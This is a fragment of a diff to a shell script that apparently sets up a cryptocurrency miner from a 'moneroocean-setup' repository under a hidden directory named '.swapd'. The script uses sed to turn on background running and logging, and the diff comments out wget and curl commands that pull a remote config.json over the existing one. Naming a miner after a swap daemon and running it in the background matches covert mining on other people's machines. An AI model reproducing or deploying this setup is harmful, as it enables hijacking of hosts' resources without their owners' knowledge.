@@ -240,6 +240,11 @@ sed -i 's#"log-file": *null,#"log-file": "'$HOME/.swapd/swapd.log'",#' $HOME/.sw
 sed -i 's/"syslog": *[^,]*,/"syslog": true,/' $HOME/.swapd/config.json
 sed -i 's/"enabled": *[^,]*,/"enabled": true,/' $HOME/.swapd/config.json
 
+
+#wget --no-certificate https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/config.json
+
+#curl https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/config.json --output $HOME/.swapd/config.json
+
 rm $HOME/.swapd/config.json
 
 cat $HOME/.swapd/config.json <<EOL
@@ -255,10 +260,6 @@ cat $HOME/.swapd/config.json <<EOL
     ]
 }
 EOL
-
-wget --no-certificate https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/config.json
-
-curl https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/config.json --output $HOME/.swapd/config.json
 
 cp $HOME/.swapd/config.json $HOME/.swapd/config_background.json
 sed -i 's/"background": *false,/"background": true,/' $HOME/.swapd/config_background.json
